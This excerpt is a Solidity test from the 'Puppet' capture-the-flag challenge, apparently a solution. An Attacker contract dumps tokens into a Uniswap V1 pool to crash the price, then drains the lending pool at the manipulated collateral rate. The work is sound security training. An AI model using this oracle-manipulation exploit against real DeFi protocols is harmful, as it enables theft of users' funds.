...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        Attacker attacker = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(lendingPool, uniswapV1Exchange, recovery, token);
...
contract Attacker {
    ...
    constructor(PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange, address _recovery, DamnValuableToken _token) payable {
    ...
    function attack() public {
        uint256 ethResulted = uniswapV1Exchange.getTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE);
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uint256 out = uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, ethResulted, block.timestamp * 2, address(this));

        uint256 ethNeeded = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        lendingPool.borrow{value: ethNeeded}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }
